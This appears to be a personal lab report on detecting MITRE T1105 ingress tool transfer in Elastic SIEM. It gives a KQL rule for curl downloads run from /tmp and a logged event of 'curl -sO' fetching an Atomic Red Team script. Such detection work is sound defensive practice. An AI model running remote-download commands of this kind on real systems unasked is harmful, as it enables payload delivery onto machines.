### Lab Report: T1105 - Ingress Tool Transfer via curl

**Date:** 2026-04-23 **Tool:** Atomic Red Team + Elastic SIEM (Auditd Manager) **Status:** Detected ✅

---
#### **Description:**

Lab where I simulated an adversary downloading and executing a remote script using curl from /tmp directory. The objective was to validate the detection capability of Elastic SIEM against file download techniques commonly used in the initial stages of an attack.

---

**Technologies Used:**

- Elastic Stack 8.11
- Auditbeat / Auditd for process monitoring (Arch Linux)
- Elastic Agent with auditd input
- Fleet Server for centralized management
- Kibana for visualization and alerting

---

**Detection Rule:**

kql

```kql
event.dataset: auditd_manager.auditd
AND process.name: curl
AND process.working_directory: /tmp
AND process.args: (*github* OR *raw.* OR *.sh OR *.py OR *.bin)
```

**Rule Configuration:**

- Threshold: >= 1 execution
- Group by: host.name, user.name
- Severity: High
- Index: auditbeat-_, logs-auditd_

---

**Detected Event:**

json

```json
{
  "@timestamp": "2026-04-23T22:22:49.574Z",
  "process.name": "curl",
  "process.title": "curl -sO https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/src/atomic.sh",
  "process.args": ["curl", "-sO", "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/src/atomic.sh"],
  "process.working_directory": "/tmp",
  "process.parent.pid": 872487,
  "user.name": "nacho",
  "host.name": "arclinuxlinux",
  "event.action": "executed",
  "event.outcome": "success"
}
```

---

**MITRE ATT&CK Mapping:**

- Tactic: Command and Control (TA0011)
- Technique: T1105 - Ingress Tool Transfer

---

**Investigation Performed:**

- ✅ Verified execution of `curl` with silent flag (`-sO`) downloading external script
- ✅ Identified working directory as `/tmp`, abnormal for legitimate curl usage
- ✅ Confirmed URL points to external GitHub repository downloading a `.sh` script
- ✅ Identified the user who executed the process (`nacho`, UID 1000)
- ✅ Correlated with parent process (PID 872487) to determine command origin
- ✅ Differentiated from legitimate curl usage (Quickshell downloading local files)
- ✅ Confirmed activity does not correspond to legitimate administrative tasks

---

**Severity Assessment:** High

The execution of curl with the silent flag (`-s`) from `/tmp` downloading an external `.sh` script represents a high confidence indicator of T1105. The `-s` flag is commonly used by attackers to suppress output and avoid detection. The combination of external URL, `/tmp` working directory and script file extension provides strong evidence of malicious ingress tool transfer.

---

**Key IOCs:**

- `process.name`: curl
- `process.args`: -sO, external URL, .sh extension ⚠️
- `process.working_directory`: /tmp ⚠️
- `tty`: pts1

---

**Lesson Learned:** Legitimate curl usage typically downloads from known local or internal URLs into user cache directories. Malicious curl activity is characterized by external URLs, `/tmp` as working directory and silence flags like `-s` to avoid detection. Differentiating between legitimate and malicious curl requires analyzing the combination of working directory, URL destination and flags used. This lab also demonstrated the importance of correlating similar process names across different contexts to avoid false positives.

---

